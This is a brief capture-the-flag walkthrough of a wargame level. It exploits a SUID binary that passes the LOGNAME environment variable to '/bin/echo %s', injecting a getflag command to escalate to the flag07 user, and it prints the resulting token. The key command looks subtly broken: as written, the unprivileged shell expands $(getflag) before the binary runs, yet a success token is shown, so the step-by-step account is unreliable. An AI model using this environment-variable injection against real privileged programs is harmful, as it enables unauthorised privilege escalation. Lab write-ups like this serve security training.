# Level07

### 1. Identity

```bash
$ id
uid=2007(level07) gid=2007(level07) groups=2007(level07),100(users)
```

We are logged in as **level07**.

### 2. Home directory

```bash
$ pwd
/home/user/level07

$ ls -la
...
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
...
```

We have a SUID binary owned by flag07:
- **Owner** : flag07
- **Group** : level07
- **Permissions** : rwsr-sr-x

This means the binary will execute with the UID of **flag07**, which is exactly what we need to retrieve the next flag.

### 3. Analyzing the ELF

With `strings` :

```bash
...
LOGNAME
/bin/echo %s
...
```

It looks like our program prints the `LOGNAME` variable from our env.

Using `env` :

```bash
...
LOGNAME=level07
...
```

### 4. Exploiting the ELF

We just have to modify the env variable `LOGNAME` so it can execute getflag in the program.

What we do :

```bash
$ export LOGNAME=$(getflag)
```

### 5. Getting the FLAG

We now get the following output :

```bash
$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

BINGO !!!
